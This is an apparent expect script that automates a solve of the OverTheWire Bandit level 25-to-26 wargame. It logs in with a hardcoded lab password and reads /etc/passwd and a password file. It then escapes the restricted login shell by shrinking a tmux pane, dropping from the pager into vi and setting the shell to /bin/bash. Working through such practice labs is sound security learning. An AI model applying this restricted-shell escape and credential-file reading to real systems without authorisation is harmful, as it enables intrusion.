#!/usr/bin/expect -f

spawn ssh -l bandit25 -p 2220 bandit.labs.overthewire.org
expect {
    "*yes/no*" { send "yes\r" ; exp_continue }
    "*assword: " { send "uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG\r" ; }
}

expect "*\$ "
send "cat /etc/passwd | grep bandit26\r"
expect "*\$ "
send "file /usr/bin/showtext\r"
expect "*\$ "
send "cat /usr/bin/showtext\r"
expect "*\$ "

send "tmux\r"
sleep .5
send "resize-pane -D 60\r"
sleep .5

send "ssh -o \"StrictHostKeyChecking no\" -i bandit26.sshkey bandit26@localhost\r"
expect "*\$ "
send "v"
sleep .5
send ":e /etc/bandit_pass/bandit26"
sleep 2
send ":set shell=/bin/bash\r"
sleep .5
send ":shell\r"